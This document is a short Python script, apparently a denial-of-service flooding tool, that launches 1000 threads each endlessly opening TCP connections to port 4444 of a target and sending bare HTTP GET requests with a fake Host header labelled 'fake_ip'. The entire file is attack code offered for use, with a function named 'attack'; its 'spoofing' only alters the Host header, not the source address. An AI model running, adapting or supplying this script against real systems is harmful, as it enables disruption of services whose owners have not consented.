#!/usr/bin/python3

import threading
import socket

target = socket.gethostbyname(socket.gethostname())
port = 4444
fake_ip  = "127.1.1.1"

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
